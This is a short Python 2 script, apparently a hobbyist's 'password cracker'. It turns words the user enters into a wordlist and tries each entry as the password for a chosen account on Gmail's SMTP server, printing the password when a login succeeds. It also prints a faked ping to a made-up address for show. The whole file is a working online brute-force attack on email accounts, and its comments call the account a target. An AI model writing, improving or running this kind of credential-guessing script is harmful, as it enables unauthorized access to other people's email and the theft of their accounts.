#usr/bin/python2.7
#Furkan'in sifre kiricisi
#Furkan's Password Cracker (frknspc)
#All this python script coded by Me not for public release.
import time
import itertools, string

class bcolors:				#RENKLER
	HEADER = '\033[95m'
	OKBLUE = '\033[94m'
	OKGREEN = '\033[92m'
	WARNING = '\033[93m'
	FAIL = '\033[91m'
	ENDC = '\033[0m'
	BOLD = '\033[1m'
	UNDERLINE = '\033[4m'
prompt = bcolors.OKBLUE + 'frknspc' + bcolors.ENDC + ' '


print "ping (222.12.154.102)"			#PING YAZISI/PING (CONTROLING CONNECTION) BUT ITS JUST A PRINT
print "ping (222.12.154.102) 56(84) bytes of data"
print "64 bytes ev.e-bnk.org (222.12.154.102): icmp_req=1 ttl=11"
print "1 packets transmitted, 1 received, 0% packet loss, time 0."

s = raw_input("frknspc -list pswList.list-add ")

from itertools import product
l = s.split()
filename = "pswList.txt"
r="""
""".join(''.join(k*v for k,v in zip(l, x))		#KELIME COMBINI (WORDLIST OLUsTURMA) / COMBINE GIVEN WORDS (WORDLIST-DICTIONARY GENERATOR)
           for x in product(range(2), repeat=len(l))
           if sum(x) > 1)
f = open(filename, 'w')
print >>f, r
f.write(r)
import smtplib

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)		#SMTP ADRESi VE PORTU / SMTP ADDRESS AND PORT FOR ATTACK
smtpserver.ehlo()
smtpserver.starttls()

user = raw_input("frknspc  -ip 222.12.154.102 -psw pswList.txt -usr ")		#HEDEF SEciMi / SELECTING TARGET
passwfile = ("pswList.txt")
passwfile = open(passwfile, "r")

filename = "pswList.txt"
numWords = 0

with open(filename, 'r') as file:
    for line in file:
	wordaList = line.split()
	numWords += len(wordaList)

i=0
start_time = time.time()
for password in passwfile:
	i=i+1
	try:
		smtpserver.login(user, password)

		print "Password: %s" % password				#FINAL KISIM / FINAL PART
		print "Scanning Complete." 
		print 'Time elapsed: ' + str(time.time() - start_time)
		break;
	except smtplib.SMTPAuthenticationError:
		print "Scanning word " , str(i) , " of " , (numWords) , "\r",
print "                                \r",
print "No match found."
